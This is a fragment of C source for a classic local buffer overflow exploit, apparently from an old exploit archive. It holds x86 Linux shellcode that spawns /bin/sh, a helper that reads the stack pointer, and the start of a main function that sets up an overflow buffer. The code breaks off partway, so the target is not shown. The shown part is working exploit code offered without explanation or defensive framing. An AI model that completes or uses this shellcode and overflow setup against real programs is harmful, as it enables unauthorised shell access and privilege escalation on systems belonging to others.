#include <stdio.h>
#include <stdlib.h>
#define RET                 1024
#define RANGE         200


char shellcode[]=
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
	"\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
	"\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff"
	"/bin/sh";
	
unsigned long
get_sp(void)
{
        __asm__("movl %esp,%eax");
}

int
main(int argc,char* argv[])
{
	 int offset=0,bsize=RET+RANGE+1;
	 int i;
	 char buff[bsize],*ptr;
	 long ret;
	 unsigned long sp;
	 
	 if(argc<1)
	 {
}